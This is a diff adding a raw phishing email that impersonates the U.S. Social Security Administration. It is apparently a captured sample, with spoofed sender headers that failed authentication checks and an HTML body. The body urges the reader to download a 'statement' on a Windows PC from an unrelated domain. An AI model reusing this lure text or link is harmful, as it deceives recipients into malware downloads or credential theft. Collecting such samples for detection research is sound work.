@@ -1,0 +1,48 @@
+Return-Path: <socialsecurity.mail@secure.net>
+Received: from secure.net ([168.107.71.220])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id mnau06ei6bm9afmh451ijj8stk6945tivvsmamo1
+ for zingerpie@kfcreview.com;
+ Mon, 23 Nov 2026 22:02:14 +0000 (UTC)
+Received-SPF: none (spfCheck: 168.107.71.220 is neither permitted nor denied by domain of secure.net) client-ip=168.107.71.220; envelope-from=socialsecurity.mail@secure.net; helo=secure.net;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 168.107.71.220 is neither permitted nor denied by domain of secure.net) client-ip=168.107.71.220; envelope-from=socialsecurity.mail@secure.net; helo=secure.net;
+ dmarc=none header.from=secure.net;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFIWFl0V3p5czlsaGtIM1ZKdWlqUC8vdysvKzFmRkxrSDNUaFlqbjY2OUd1MElpbm04allxOUU2d25LKzJlVzUrREg0SXRYWVpNRnZPdkVlT05sY1dxY09IMGlvTk9LaVo3YVhqWkI4ZHliSlpBN3pRbmJJRVViaWV1akpRWkNXRGJaWTV0UDVRTDZpYzBwcG8vRGhmeng3N05kaUF5SkhMbTlyRHd3eHhZVkdXemtYRis4ZlE4LzZXSzdkN1dTa1lwcHdVd3g0RWlqQktYa2lpS3BrZjFEY2E5V1paOE9jemJWMUdtaEZlV3NKN3UvV0JBNElqSmhiK3IxbE92KzU0end4V1o2UUM2RStxeVJFVFdsMU5GZmtCYWtya3FiUkdFcXJrS1k4TFhNcURWanhYV1BEMlp5bE5saUpSTFVrSXc9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=hflO1kYghSTYWvfZTsEn5xrNR9HD2m96zyi7atYlvw/6Hp/yKsuYjwVFNHvPF7JwDduM1rABo4hI4JLfQXjYXginBRg6W5FYr1dS4ScFVZw2e3eeyaEiKLsqeb21dcK1UuYAFTphAIjWx67TbvMvLnXep+tzuptdcF34OqeFaNQ=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1795471335; v=1; bh=pVuyq/H8I8AD5yST+CO9UmAGddp2ycnUT/43Hrwo4Ok=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "U.S Social security"<socialsecurity.mail@secure.net>
+To: zingerpie@kfcreview.com
+Subject: AN IMPORTANT SSA MESSAGE
+Date: 23 Nov 2026 22:02:13 +0000
+Message-ID: <20261123220212.C14A02CC24E42BFA@secure.net>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<html><head><title>SSA statement</title><meta charset=3D"utf-8"/><meta name=
+=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D1.0"/></head=
+><body style=3D"font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Rob=
+oto,sans-serif;background:#eef2f7;padding:30px;margin:0"><div style=3D"max-=
+width:540px;background:#ffffff;padding:32px 36px;margin:0 auto;border-radiu=
+s:16px;box-shadow:0 8px 20px rgba(0,0,0,0.05)"><div style=3D"font-size:22px=
+;margin-bottom:2px;font-weight:400;color:#002856">Social Security Administr=
+ation</div><div style=3D"font-size:13px;margin-bottom:25px;color:#657e9f">O=
+fficial Communication: Statement Review &amp; Consultation</div><div style=
+=3D"font-size:12px;margin-bottom:20px;color:#002856;letter-spacing:0">STATE=
+MENT AVAILABLE</div><p style=3D"margin:0 0 18px">zingerpie@kfcreview.com,</=
+p><p style=3D"margin:0 0 18px">Your latest my social security statement is =
+now available. To ensure your information is accurate, we recommend reviewi=
+ng the statement and downloading it for your records.</p><div style=3D"back=
+ground:#fafafa;padding:18px 22px;margin:20px 0 25px;border-radius:8px"><spa=
+n style=3D"color:#cc0000">Action Required:</span> To access shared document=
+ portals, open this statement on a PC or Windows device. </div><p style=3D"=
+margin:28px 0 22px"><a style=3D"font-size:15px;text-decoration:none;backgro=
+und:#002856;color:white;padding:11px 32px;display:inline-block;border-radiu=
+s:40px" href=3D"https://al-kamilah.org/reply">Download Statement</a></p><p =
+style=3D"font-size:13px;color:#5a7295">Privacy Notice: This email contains =
+no sensitive information. Please ensure you're using a secure device when d=
+ownloading the statement.</p><p style=3D"font-size:13px;color:#5a7295">If y=
+ou did not request this, no further action is needed.</p><div style=3D"font=
+-size:12px;border-top:#e2eaf2 1px solid;margin-top:28px;color:#8197b5;paddi=
+ng-top:16px">&#3593; 2026 Social Security Administration</div></div></body>=
+</html>
